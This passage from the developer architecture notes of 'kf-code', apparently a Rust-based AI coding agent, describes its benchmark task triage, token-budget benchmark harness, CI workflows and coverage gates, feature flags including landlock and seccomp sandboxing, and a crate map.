| 9 Split Giant File | B | 2500-line file split | deferred → ADR-077 |
| 18 Add REST Endpoint | D | non-Rust task setup | deferred → ADR-077 |
| 22 Build Verification | E | standalone build-verify task | implement |
| 23 Formatter Verification | E | standalone fmt-verify task | implement |
| 24 Lint Verification | E | standalone lint-verify task | implement |
| 27 Large Repository Navigation | F | context index at Linux-scale | deferred → ADR-077 |
| 32 Large Refactor | G | 50+ files | deferred → ADR-077 |
| 33 Merge Conflict Resolution | G | realistic conflict resolution | deferred → ADR-077 |
| 35 Regression Detection | G | PR regression prediction | deferred → ADR-077 |
| 36 Token Efficiency | H | standalone token-efficiency task | dropped (ADR-077) |
| 37 Dollar Cost | H | standalone cost task | dropped (ADR-077) |
| 38 Time | H | standalone latency task | dropped (ADR-077) |
| 39 Retry Count | H | standalone retry-count task | dropped (ADR-077) |
| 40 Human Intervention | H | standalone intervention task | dropped (ADR-077) |

3 spec tasks had no mapping yet — a known gap, now triaged in ADR-077:

- **Implement Missing Trait** → implement (deterministic compile-check verify).
- **Fix Integration Test** → deferred → ADR-077 (needs a live
  integration-test fixture baked into the task).
- **Fix Compilation Error** → dropped (ADR-077) — subsumed by the existing
  slot-16 tasks (`fix_borrow_error.toml`, `fix_lifetime_error.toml`).

Reconciled arithmetic: 30 implemented tasks cover 18 of the 40 spec slots;
4 implement-backlog; 12 deferred (→ ADR-077); 6 dropped (→ ADR-077) → 40
slots accounted for.

The harness (`kf-bench` crate + `src/session/bench.rs`) spins up a
headless agent session with a real model adapter, auto-approves all tool calls,
runs the task, then verifies the result deterministically. Reports are written as
JSON and markdown.

### Token Budget Challenge (WO 14.7, ADR-0066)

The signature benchmark. It runs the same task 5× under descending context
budgets (128k → 64k → 32k → 16k → 8k) and records six metrics per ceiling:
success, prompt tokens, completion tokens, compression passes, cost. This
showcases the tree-sitter context index, Stratum compression, and the budget
budget guard under progressively tighter budgets — the architectural
differentiator vs Claude Code / Vix / opencode.

- **Task**: `benches/tasks/token_budget_challenge.toml` — a small Rust crate
  with a failing test the model must fix (wire a `--verbose` flag into a stub
  parser). `requires_model = true` so `bench verify-only` skips it.
- **Runner**: `run_token_budget_challenge` in `src/session/bench.rs` runs the
  task once per ceiling in `BUDGET_CHALLENGE_CEILINGS = [131_072, 65_536,
  32_768, 16_384, 8_192]`. Each run clones the task with `budget_ceiling` set;
  the runner exports `KF_CODE_BUDGET_CEILING=<n>` to the agent's env so the
  budget guard enforces it for that run, then clears it after. `run_all`
  dispatches on the task name (`token_budget_challenge`) to the loop instead
  of the single-run path.
- **Report**: `BudgetChallengeReport` (in `kf-bench`) records the six
  metrics per ceiling; `write_budget_challenge_report` emits the markdown
  scoreboard table (ceiling × success × prompt tokens × completion tokens ×
  compression passes × cost). `TaskResult` gained a serde-optional
  `compression_passes` field (counts `TurnEvent::CompactionReport`) for this.
- **Budget env wiring**: `BenchTask::budget_ceiling: Option<usize>`
  (serde-optional, default `None`) is the task-side field. The
  `KF_CODE_BUDGET_CEILING` env hook in `env_overrides.rs` (mirrors
  `KF_CODE_MINIFY_ABOVE_BYTES` from WO 9.7) reads it into
  `cfg.tools.budget_ceiling`; `init_from_config` applies it to the shared
  `TokenBudget`. No new budget code — reuses ADR-0005 / WO 7.5 / WO 8.6.

A `bench` workflow ran all tasks on Ollama with `qwen2.5:0.5b` on push to main
and posted a delta summary as a PR comment comparing against the `main`
baseline (ADR-045). The bench-baseline workflow file was deleted in the CI
architecture reset (ADR-074) as an obsolete artifact — the bench CI loop
(see "Bench CI loop" below) is no longer active.

### Bench CI loop (WO 10.9) — *deleted* (ADR-074 CI reset)

The bench CI loop was previously a disabled workflow file (deleted in
ADR-074 CI reset). The design was:

1. **`bench-baseline`** (push to main): runs `bench run` with
   `qwen2.5:0.5b`, uploads the report as a 90-day-retention artifact.
   This is the baseline the PR-delta job compares against.
2. **`bench-pr-delta`** (pull request): runs `bench run` on the PR
   HEAD, downloads the latest main-branch baseline, computes the delta
   with `bench compare --fail-on-regression 10`, posts the delta as a
   PR comment, and **fails the job** if the success rate dropped by
   more than 10 percentage points (the regression gate, WO 10.9). The
   comment still posts via `if: always()` so the operator sees the
   numbers even when the gate fails.
3. **`bench-leaderboard`** (scheduled, daily): runs `bench run-models
   --models qwen2.5:0.5b,llama3.2:1b`, writes
   `docs/bench/leaderboard.md`, and commits it to `main` via
   `stefanzweifel/git-auto-commit-action` with `[skip ci]` in the
   commit message. The push trigger also has `paths-ignore:
   ['docs/bench/**']` (expressed as `!docs/bench/**` in the paths
   list) so the leaderboard commit does not re-trigger the bench
   workflow (belt-and-suspenders loop avoidance).

The `bench compare --fail-on-regression <pct>` CLI flag (WO 10.9) uses
`compare_with_threshold(baseline, current, threshold)` in the
`kf-bench` crate. The threshold is a fraction (0.10 = 10
percentage points); the CLI flag takes a percentage (10). The
regression is detected when `success_rate_delta < -threshold` (strict
inequality: a drop of exactly the threshold is not a regression).

The PR-delta job is single-model (`qwen2.5:0.5b` only) because the
second `ollama pull` adds 2-5 minutes per model and the PR job is
latency-sensitive. The scheduled leaderboard covers multi-model
comparison.

### Coverage gate (WO 12.9, ADR-065; per-crate regression gate WO 28.7)

The CI `coverage` job runs in `ci-nightly.yml` only (per ADR-074 reset —
was in the old monolithic workflow pre-split, then in ci-merge.yml
pre-reset). It runs `cargo llvm-cov --workspace --lcov
--output-path lcov.info` and uploads `lcov.info` as an artifact.
`scripts/check-cov-regression.sh` (WO 28.7) parses that lcov per-crate
(by source-path prefix) and fails if any crate drops >1% below its floor
in `docs/coverage-baseline.md`. Current floors (measured 2026-08-13):
`kf-code` 78.4%, `kf-budget-core` 86.5%, `kf-testdoctor` 71.2%,
`kf-compress-core` 95.2%, `kf-plugin-host` 88.8%, `kf-bench` 88.3%. The
local `ci-local.sh full` runs the same gate; a separate per-directory
tarpaulin gate (`src/session` 68.5%, `src/tools` 76.0%, `src/adapters`
75.0%) is drift-guarded by the kf-testdoctor `default_thresholds_match_local_gate`
test. The gate is a regression guard, not a vanity number — the -1%
tolerance absorbs run-to-run llvm-cov variance.

### Non-Rust linting (WO 26.6-R3)

The Rust workspace is linted with `cargo clippy`. The TS tree that used to
live under `npm/kf-plugin/` (ESLint) was deleted in WO 29.9 when the TS→Rust
migration completed; there is no in-tree JavaScript to lint. No Python source
is linted in-tree; the only `.py` files are test fixtures and a release
script, so `ruff` is not wired.

### CI workflows (2026-08-15 split, ADR-074 reset)

The monolithic CI workflow was split into three trigger-scoped files
(WO 33.3) and then reset per ADR-074 (WO 33.x). The reset removed the
artificial `needs:` chain in ci-merge (all merge jobs are now parallel
siblings depending on `static` only), moved Ollama integration tests +
coverage to nightly-only, replaced inline `--config` nextest flags with
declarative `--profile` (`ci-full` for windows, `e2e` for e2e), scoped
clippy (PR `--lib --bins`, merge `--all-targets`), renamed the `fmt` job
→ `static` (it does conflict markers + TOML schema + artifact
consistency + rustfmt), and stripped WO-incident comments (historical
rationale moved to ADR-074). CI references below should read as the new
files:

| File | Trigger | Jobs | Target |
|---|---|---|---|
| `.github/workflows/ci-pr.yml` | `pull_request` | `static`, `changes` (path-aware, WO 33.6), `clippy` (`--lib --bins`), `fast-tests` (nextest `ci-fast`), `dead-refs`, `adr-xref` | <5 min PR gate, fail-fast + concurrency cancellation |
| `.github/workflows/ci-merge.yml` | `push` to `main`/`dev` | `static` → parallel `{clippy` (`--all-targets`), `full-tests` (nextest `ci-full`), `windows` (nextest `ci-full`), `e2e` (nextest `e2e`, `--features e2e-tests`)}` | pre-merge gate; no Ollama, no coverage (both nightly-only per ADR-074) |
| `.github/workflows/ci-nightly.yml` | `schedule` + `workflow_dispatch` | `coverage` (full llvm-cov + `check-cov-regression.sh`), `ollama` (live model integration), `subprocess-lifecycle` (ignored timeout tests, WO 45.59/48.22), `e2e-exhaustive`, `feature-combos` (opt-in feature compile rung + pty test execution, WO 48.44/48.51), `audit`, `mutants` (informational), `release-build` matrix | nightly depth + slow jobs that don't belong on PRs |

The `static` job (renamed from `fmt` in ADR-074) runs conflict-marker
detection, TOML schema validation, `scripts/check-artifact-consistency.sh`
(dead crate/binary refs, WO 28.12), and `cargo fmt --check`. Coverage
gate (`scripts/check-cov-regression.sh`, WO 28.7) now runs in
`ci-nightly.yml` only (was in ci-merge.yml pre-ADR-074). The PR `clippy`
gate is `--lib --bins` (was `--all-targets`) for faster feedback; the
merge job still runs `--all-targets`.

### Nextest profiles (WO 33.5)

`.config/nextest.toml` defines four profiles so CI doesn't inline `--config`
flags:

| Profile | Scope | Used by |
|---|---|---|
| `ci-fast` | lib + bins, no integration/e2e | `ci-pr.yml` `fast-tests` |
| `ci-full` | whole workspace, no e2e/integration | `ci-merge.yml` `full-tests` + `windows` |
| `integration` | integration tests (needs live Ollama) | `ci-nightly.yml` `ollama` (per ADR-074 — was in ci-merge pre-reset) |
| `e2e` | binary-spawn e2e suite (feature-gated `e2e-tests`) | `ci-merge.yml` `e2e` + `ci-nightly.yml` `e2e-exhaustive` |

Invoke locally: `cargo nextest run --profile ci-fast`.

### Path-aware changed-package selection (WO 33.6)

`scripts/changed-packages.sh` maps `git diff --name-only <base>..HEAD` to
affected cargo packages including reverse-dep closure (4 internal edges,
hardcoded adjacency table — `ponytail:` ceiling documented in script).
`ci-pr.yml` runs a `changes` job that gates `clippy` + `fast-tests` on
the output; docs-only / non-Rust changes emit `__NO_RUST_CHANGES__` and
skip Rust CI entirely.

### Test-tier improvements (WO 33.12-33.16, kf-rbac)

Three test-tier hardening items shipped in the WO 33 series:

- **Phase 1 sleep elimination (WO 33.12):** killed remaining wall-clock
  sleeps in tests — replaced with event-driven synchronization (poll
  helpers, `yield_now`, readiness probes). 9 files touched; genuine
  timeout tests kept as-is.
- **Phase 2 env-mutation elimination (WO 33.13/33.16):** replaced every
  raw `std::env::set_var`/`remove_var` in test code with the `EnvGuard`
  RAII helper (`src/shared/test_util.rs`) that restores the prior value
  on Drop, making parallel `#[test]` execution safe without
  `#[serial]`. 18 files touched; widened `EnvGuard::set` to
  `impl AsRef<OsStr>`. Zero raw env mutations remain in test bodies.
- **kf-rbac JWT test speedup (historical; JWT half deleted in WO 47.3):**
  a `JwksResolver` trait once made the JWKS fetch the only network step
  in `verify_jwt` so tests could inject an in-memory fake (690.8s → <0.5s
  for the 8 slow JWT tests). Deleted along with the dead JWT/JWKS code.

### `kf-code update` subcommand (WO 33.17)

`kf-code update` self-updates the binary: downloads the latest GitHub
release, verifies the SHA256 checksum against the release `SHA256SUMS.txt`,
extracts the `kf-code` binary, and replaces the running binary in place via
an atomic rename. `kf-code update --check` prints current vs latest version
without installing. Target-triple detection mirrors `scripts/install.sh`
(linux x86_64/aarch64, macOS x86_64/aarch64). Uses only existing deps
(reqwest, sha2, hex, tempfile); extraction shells out to `tar` (present on
every Linux/macOS) to avoid pulling `flate2`+`tar` crates into the
size-optimized release binary. Windows is not supported (running binary is
locked) — matches `install.sh`'s stance.

### LSP disabled in editor config (2026-08-15)

The opencode `lsp: true` config entry in `~/.config/opencode/opencode.jsonc`
was flipped to `false` after it caused worktree data loss. rust-analyzer
indexes one workspace per process, so the main checkout's LSP server
returned stale cross-workspace diagnostics for files a linked git worktree
had changed; subagents that trusted those stale diagnostics reverted files
to "fix" them, destroying other subagents' work. This is a local-config
change to the *editor-embedded* LSP, not a change to the in-repo `kf-lsp`
crate or the model-facing `lsp_query` tool (both unchanged and still
shipped). See AGENTS.md §7 "LSP diagnostics are workspace-scoped" for the
full rationale.

---

## Feature flags

The root `Cargo.toml` exposes these features:

- `stratum` (default) — folds the Stratum context-compression plugin in as
  direct Rust calls (ADR-046).
- `budget` (default) — folds the token-budget guard in as direct
   Rust calls with full in-process event context (ADR-047).
- `kf-plugin-tools` (default) — registers the six `kf-plugin` tools as
  compiled-in Rust impls (WO 29.1). `doctor`/`health`/`tools` run natively;
  `verify` (security emitter) and `audit_verify` (hash-chain walker) also run
  natively since WO 35.6; `verify_workspace` reports not-implemented (the
  crate reducer shipped in WO 37.2/ADR-076; this tool is not yet wired to
  it). With the feature off, no `kf-plugin` tools are
  registered — the shell/Node fallback that lived under
  `plugins/kf-plugin/` was deleted in WO 29.9.
- `pty` (non-default) — PTY-backed interactive bash commands via `portable-pty`
  (WO 21.5-R2; opt in via `--features pty`).
- `computer_use` (non-default) — Anthropic hosted computer_use beta
  (coordinate-vision model). Adapter wire format: serializes a `computer`
  tool as `{"type":"computer_20250124",...}`, sends the
  `anthropic-beta: computer-use-2025-01-24` header, and parses
  `computer_tool_result` content blocks (WO 28.16 R1–R3). The vision
  execution loop (R4 — screenshot capture + coordinate-action routing)
  shipped in WO 32.17: `ComputerUseConfig.hosted` flag (env
  `KF_CODE_COMPUTER_USE_HOSTED`, TOML `[computer_use].hosted`) activates
  the hosted tool; `computer_use.rs` splits into `local_def()` /
  `hosted_def()` and dispatches to `run_hosted_action()` which translates
  Anthropic's action vocabulary to CDP + always captures a screenshot for
  the next model turn. Opt in via `--features computer_use`; default OFF
  so zero computer_use wire bytes reach the API in a default build. Since
  WO 43.20 the feature also gates the local headless-Chrome path: it is
  `computer_use = ["dep:headless_chrome"]`, so default builds do not
  compile `headless_chrome` / `chrome_launcher.rs` at all — the local
  `computer_use` tool (`src/tools/computer_use.rs`) falls back to
  `PlaceholderTab` (fails gracefully at runtime) when the feature is off.
- `landlock` – no longer a Cargo feature (WO 27.1). There is no `landlock`
  feature key in `[features]` at all; the landlock module is compiled
  unconditionally on Linux via `cfg(target_os = "linux")` and applied by
  default in the bash `pre_exec` hook (fail-closed). Operators escape via
  `--i-accept-unsandboxed` on kernels where `restrict_self` errors;
  `landlock_extra_paths` in config.toml extends the allow-list.
- `seccomp` (non-default) — Linux seccomp-bpf syscall filter for bash
  subprocesses (WO 30.4). Confines the syscall surface to an allowlist;
  everything else fails with `EPERM` (graceful, not `SIGSYS`-kill). Applied
  in the same `pre_exec` hook as landlock + rlimits, after landlock. Default
  OFF: opt in via `--features seccomp`. The allowlist is a starting set
  (bash + grep/sed/awk/curl/cargo/node/python + the glibc startup syscalls);
  real-workload tuning is deferred (see WO 30.4). Brings in the
  `seccompiler` crate (pure-Rust BPF compiler, no C deps).
- `devtools` (non-default) — compiles the developer tooling into the
  binary (WO 47.5): the `bench` subcommand (kf-bench + the session bench
  harness in `src/session/bench.rs`) and the `doctor` subcommand
  (kf-testdoctor). Default OFF: the release binary ships without ~5K
  dev-tool lines and the subcommands do not exist. Opt in via
  `--features devtools`. `kf-testdoctor` also has its own standalone bin
  (`cargo run -p kf-testdoctor -- …`) that builds without this feature.
- `e2e-tests` (non-default) — gates the binary-spawn e2e suite
  (`tests/e2e/`); CI runs it in a dedicated job with
  `--features e2e-tests` (WO 28.10).
- `otel` (non-default) — OpenTelemetry span/metric export.

 Three plugins are feature-gated compiled-in modules, served as direct Rust
 calls when their feature is on. `stratum` and `kf-budget` have no shell-plugin
 fallback (the shell trees were deleted in WO 29.9; feature-off registers
 nothing); `kf-plugin` likewise (its shell tree was deleted in WO 29.9).
 ADR-050 pins the two-path dispatch consolidation design. The `dep:`
 optional-dependency pattern is what makes per-plugin opt-in possible.

ADR-0017's "no `[features]` section" rule is scoped to `crates/kf-budget-core/`,
not the root binary.

---

## ADRs

94 Architecture Decision Records live in [docs/adr/](docs/adr/). They pin
load-bearing decisions: token budget (0005), slicing orchestrator (0007),
verifier bus (0028, 0043), context index (037), benchmark harness (038),
execution replay (039), VFS minification (053), coverage-gate threshold
policy (065), CI architecture reset (074), Emission flattening for the
executor-backed ModelClient (075), the reducer contract for
`DelegationResult.packet` (076), the bench spec task triage (077), and many
more. A drift test (`adr_xref_drift`) enforces that ADR file headers and
the README index table agree.

Conventions: `ponytail:` annotations pin spec literals (if a ponytail test
fails, the spec and impl drifted, not the test). `ceiling:` and `upgrade path:`
document known limitations. Removing these is a regression.

---

## Crate map

| Crate | Status | Purpose | Public API | Consumers |
|---|---|---|---|---|
| `kf-plugin-host` | Active | Plugin registry, dispatch, signatures + SDK manifest types/trust tiers (WO 47.4 fold) | `PluginHost`, `PluginToolWrapper`, `PluginManifest`, `TrustTier` | root binary |
| `kf-context-index` | Active | Tree-sitter symbol/import/call-graph index | `ContextIndex`, `CachedIndex` | root binary |
| `kf-workflow` | Active | JSON workflow engine (DAG of persona steps) | `WorkflowExecutor`, `WorkflowTemplate` | root binary |
| `kf-lsp` | Active | LSP client pool for symbol-aware navigation | `LspPool` | root binary |
| `kf-bench` | Active | Benchmark task types, loader, verifier, reports | `BenchTask`, `TaskResult` | root binary (via `devtools` feature, WO 47.5), bench CI |
| `kf-compress-core` | Active | Context-compression pipeline library | `CompressionPipeline`, `Mode`, `rules::build_rules` | root binary (via `stratum` feature) |
| `kf-budget-core` | Active | Budget/orchestrator/slicing data model | `TokenBudget`, `SlicingOrchestrator` | root binary (via `budget` feature) |
| `kf-rbac` | Active | RBAC + timing-safe API-key auth (port of `@kirkforge/core-rbac`; JWT half deleted WO 47.3) | `Actor`, `Role`, `Permission`, `actor_from_api_key`, `has_permission` | root binary (daemon authz) |
| `kf-orchestrator` | Active | Orchestrator delegation + decompose + correction pipeline (port of `@kirkforge/orchestrator`) + folded routing/memory modules (WO 47.4) | `Orchestrator`, `delegate`, `run_correction_loop`, `ModelClient`, `WorkspaceManager`, `verifier::scan_files`, `routing::tokenize`, `memory::MemoryStore` | standalone (foundation for full executor wiring) |
| `kf-testdoctor` | Active | Test-performance diagnostics | `doctor` CLI | root binary (via `devtools` feature, WO 47.5) + own standalone bin |

"Excluded" crates exist on disk but are not built by default (`cargo build
--workspace`). They can be built explicitly with `-p <crate-name>`.

---

## Where to go next

- **README.md** — user-facing landing page
- **[docs/adr/](adr/)** — pinned decisions and their rationale
- **[docs/workorders/](workorders/)** — planned and in-progress work
- **[AGENTS.md](../AGENTS.md)** — worker contract for AI agents in this repo
- **[state.md](../state.md)** — current production-readiness state
- **[CHANGELOG.md](../CHANGELOG.md)** — release history